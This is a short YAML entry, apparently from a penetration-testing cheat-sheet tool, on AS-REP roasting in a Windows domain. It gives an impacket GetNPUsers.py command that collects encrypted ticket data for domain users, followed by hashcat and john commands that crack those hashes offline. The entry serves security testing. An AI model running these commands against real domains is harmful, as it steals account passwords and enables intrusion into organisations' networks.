name: windows_domain_asrep_rosting

info:
  title: Windows Domain AS REP Roasting
  author: evait security GmbH
  category: 04_windows_domain
  placeholder: SMBDomain
  references:
    - https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/
    - https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

content: |
  <p>Use impacket in order to obtain an encrypted TGT for a specific user.</p>
  <code>GetNPUsers.py @@SMBDomain/ -usersfile {{users_file}} -format {{hashcat,john}} -outputfile {{output_AS_REP_responses_file}}</code>
  <p>The received hashes can be attacked using bruteforce or dictionary attack with hashcat or john</p>
  <code>hashcat -m 18200 --force {{output_AS_REP_responses_file}} {{passwords_file}}</code>
  <code>john --wordlist={{passwords_file}} {{output_AS_REP_responses_file}}</code>